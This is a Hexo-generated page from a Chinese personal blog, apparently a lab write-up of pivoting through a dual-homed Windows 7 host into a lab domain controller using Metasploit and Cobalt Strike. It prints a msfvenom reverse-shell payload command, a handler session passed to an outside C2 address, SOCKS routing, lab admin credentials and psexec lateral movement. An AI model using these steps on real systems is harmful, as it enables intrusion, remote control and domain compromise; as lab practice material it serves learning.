@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="环境配置攻击机win10：192.168.124.25kali：192.168.124.28靶机：win7（web服务器，两块网卡）外网ip：192.168.124.27内网ip：192.168.52.143windows 2008 R2（内网域控主机）：192.168.52.138">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场内网穿透练习">
+<meta property="og:url" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="环境配置攻击机win10：192.168.124.25kali：192.168.124.28靶机：win7（web服务器，两块网卡）外网ip：192.168.124.27内网ip：192.168.52.143windows 2008 R2（内网域控主机）：192.168.52.138">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/kali网卡设置.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/win7网卡设置.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/win2008网卡设置.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/route.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/conf.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/浏览器代理设置.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/内网访问.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/域控访问.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/curl.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/proxifier.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/proxifier2.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/listener.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/红日靶场内网穿透练习/https.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/cs上线.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/中转监听1.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/中转监听.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/exes.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/生成payload.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/域控上线.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/网络拓扑.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/端口扫描1.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/端口扫描2.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/端口扫描3.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/smb监听.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/ls回显.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/jmp.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/138system.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/正反.png">
+<meta property="og:updated_time" content="2022-04-24T01:35:37.777Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="红日靶场内网穿透练习">
+<meta name="twitter:description" content="环境配置攻击机win10：192.168.124.25kali：192.168.124.28靶机：win7（web服务器，两块网卡）外网ip：192.168.124.27内网ip：192.168.52.143windows 2008 R2（内网域控主机）：192.168.52.138">
+<meta name="twitter:image" content="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/kali网卡设置.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/">
+
+
+
+
+
+  <title>红日靶场内网穿透练习 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/01/04/红日靶场内网穿透练习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">红日靶场内网穿透练习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-04T22:11:10+08:00">
+                2022-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机<br>win10：192.168.124.25<br>kali：192.168.124.28<br>靶机：<br>win7（web服务器，两块网卡）<br>外网ip：192.168.124.27<br>内网ip：192.168.52.143<br>windows 2008 R2（内网域控主机）：192.168.52.138<br><a id="more"></a></p>
+<p>kali网卡设置：<br><img src="/2022/01/04/红日靶场内网穿透练习/kali网卡设置.png" alt><br>win7网卡设置：<br><img src="/2022/01/04/红日靶场内网穿透练习/win7网卡设置.png" alt><br>并开启C盘下的phpstudy<br>win2008网卡设置：<br><img src="/2022/01/04/红日靶场内网穿透练习/win2008网卡设置.png" alt></p>
+<h1 id="web服务器win7上线msf"><a href="#web服务器win7上线msf" class="headerlink" title="web服务器win7上线msf"></a>web服务器win7上线msf</h1><h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><p>先不通过找靶场的漏洞来上线主机了，直接生成木马上线吧。。目的是练习内网<br>首先msfvenom生成reverse_tcp木马<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=3333 -f exe -o msfreverse.exe</span><br></pre></td></tr></table></figure></p>
+<p>然后kali打开msf：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 3333</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure></p>
+<h2 id="msf代理"><a href="#msf代理" class="headerlink" title="msf代理"></a>msf代理</h2><p>msf内置了socks代理，session还活着的情况下可以使用内置代理进行流量转发。</p>
+<p>获得shell之后，查看路由：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; route</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2022/01/04/红日靶场内网穿透练习/route.png" alt><br>通过这个session添加一条通往内网的路由：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure></p>
+<p>添加所有通过本机的流量走msf：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.124.0/24</span><br></pre></td></tr></table></figure></p>
+<p>查看一下添加的路由：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure></p>
+<p>后台运行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; bg</span><br></pre></td></tr></table></figure></p>
+<p>然后通过msf内置模块设置代理：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span>  Name                                     Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server</span><br><span class="line">   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br><span class="line">   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 0</span><br></pre></td></tr></table></figure></p>
+<p>默认使用sock5，可以直接run<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a</span><br><span class="line">                                        , 5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br></pre></td></tr></table></figure></p>
+<p>然后设置一下proxychains的代理：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~# leafpad /etc/proxychains.conf</span><br></pre></td></tr></table></figure></p>
+<p>使用dynamic_chain模式（取消掉dynamic_chain的注释），添加socks5代理<br><img src="/2022/01/04/红日靶场内网穿透练习/conf.png" alt></p>
+<p>浏览器也可以设置代理，访问内网：<br><img src="/2022/01/04/红日靶场内网穿透练习/浏览器代理设置.png" alt><br>访问：<br><img src="/2022/01/04/红日靶场内网穿透练习/内网访问.png" alt><br>访问不出网域控：<br><img src="/2022/01/04/红日靶场内网穿透练习/域控访问.png" alt><br>curl测试：<br><img src="/2022/01/04/红日靶场内网穿透练习/curl.png" alt></p>
+<p>win10中利用Proxifier做代理，win10中也可以访问到52段内网了。<br><img src="/2022/01/04/红日靶场内网穿透练习/proxifier.png" alt><br><img src="/2022/01/04/红日靶场内网穿透练习/proxifier2.png" alt></p>
+<h1 id="msf会话派生到cs"><a href="#msf会话派生到cs" class="headerlink" title="msf会话派生到cs"></a>msf会话派生到cs</h1><p>首先在cs中设置一个监听<br><img src="/2022/01/04/红日靶场内网穿透练习/listener.png" alt><br>然后回到kali的msf中进行设置：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use exploit/windows/local/payload_inject</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; set lhost cs监听ip</span><br><span class="line">lhost =&gt; 39.97.187.57</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; set lport cs监听端口</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler true</span><br><span class="line">DisablePayloadHandler =&gt; true</span><br><span class="line">msf6 exploit(windows/local/payload_inject) &gt; run</span><br></pre></td></tr></table></figure></p>
+<p>注意payload的设置要和cs监听选择的一致<br><img src="红日靶场内网穿透练习/https.png" alt><br>然后win7上线cs了。<br><img src="/2022/01/04/红日靶场内网穿透练习/cs上线.png" alt></p>
+<h1 id="cs中转监听上线不出网域控主机（反向连接）"><a href="#cs中转监听上线不出网域控主机（反向连接）" class="headerlink" title="cs中转监听上线不出网域控主机（反向连接）"></a>cs中转监听上线不出网域控主机（反向连接）</h1><p>这个意思就是把拥有两块网卡的win7作为流量中转，开启4444端口进行监听，当内网win2008主机有向win7的4444端口发送流量的时候，win7将流量转发至外网cs，反向代理连接上线。<br>首先重新生成一个中转监听器<br><img src="/2022/01/04/红日靶场内网穿透练习/中转监听1.png" alt><br>注意要填写可以互通内网的ip<br><img src="/2022/01/04/红日靶场内网穿透练习/中转监听.png" alt><br>然后生成payload<br><img src="/2022/01/04/红日靶场内网穿透练习/exes.png" alt><br><img src="/2022/01/04/红日靶场内网穿透练习/生成payload.png" alt><br>不出网域控主机win2008上线了<br><img src="/2022/01/04/红日靶场内网穿透练习/域控上线.png" alt><br>查看网络拓扑<br><img src="/2022/01/04/红日靶场内网穿透练习/网络拓扑.png" alt></p>
+<h1 id="cs上线不出网域控主机（正向连接）"><a href="#cs上线不出网域控主机（正向连接）" class="headerlink" title="cs上线不出网域控主机（正向连接）"></a>cs上线不出网域控主机（正向连接）</h1><h2 id="psexec-smb协议连接"><a href="#psexec-smb协议连接" class="headerlink" title="psexec+smb协议连接"></a>psexec+smb协议连接</h2><p>原理：</p>
+<blockquote>
+<p>SMB Beacon使用场景<br>当拿到了</p>
+</blockquote>
+<p>拿到win7的权限之后，扫描一下内网的445端口<br><img src="/2022/01/04/红日靶场内网穿透练习/端口扫描1.png" alt><br><img src="/2022/01/04/红日靶场内网穿透练习/端口扫描2.png" alt><br><img src="/2022/01/04/红日靶场内网穿透练习/端口扫描3.png" alt></p>
+<p>发现内网不出网域控win2008（192.168.52.138）也开启了445端口，可以通过smb协议进行通信。<br>建立一个smb监听：<br><img src="/2022/01/04/红日靶场内网穿透练习/smb监听.png" alt><br>执行命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.52.138\admin$ /user:"Administrator" "sec@2019" </span><br><span class="line">ls \\192.168.52.138\c$</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2022/01/04/红日靶场内网穿透练习/ls回显.png" alt><br>有回显，继续进行下一步<br>这里的smb是我建立的smb监听名<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jump psexec64 192.168.52.138 smb</span><br></pre></td></tr></table></figure></p>
+<p>连接到了内网主机，而且是SYSTEM权限<br><img src="/2022/01/04/红日靶场内网穿透练习/jmp.png" alt><br><img src="/2022/01/04/红日靶场内网穿透练习/138system.png" alt><br>查看网络拓扑可以看到，通过smb正向连接的线是黄色的（还有tcp等绿色的线，在后面记录）<br><img src="/2022/01/04/红日靶场内网穿透练习/正反.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/12/15/记录第一次破解小游戏/" rel="next" title="记录第一次破解小游戏">
+                <i class="fa fa-chevron-left"></i> 记录第一次破解小游戏
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/01/10/栈迁移/" rel="prev" title="栈迁移">
+                栈迁移 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境配置"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web服务器win7上线msf"><span class="nav-number">2.</span> <span class="nav-text">web服务器win7上线msf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#上线"><span class="nav-number">2.1.</span> <span class="nav-text">上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf代理"><span class="nav-number">2.2.</span> <span class="nav-text">msf代理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#msf会话派生到cs"><span class="nav-number">3.</span> <span class="nav-text">msf会话派生到cs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cs中转监听上线不出网域控主机（反向连接）"><span class="nav-number">4.</span> <span class="nav-text">cs中转监听上线不出网域控主机（反向连接）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cs上线不出网域控主机（正向连接）"><span class="nav-number">5.</span> <span class="nav-text">cs上线不出网域控主机（正向连接）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec-smb协议连接"><span class="nav-number">5.1.</span> <span class="nav-text">psexec+smb协议连接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
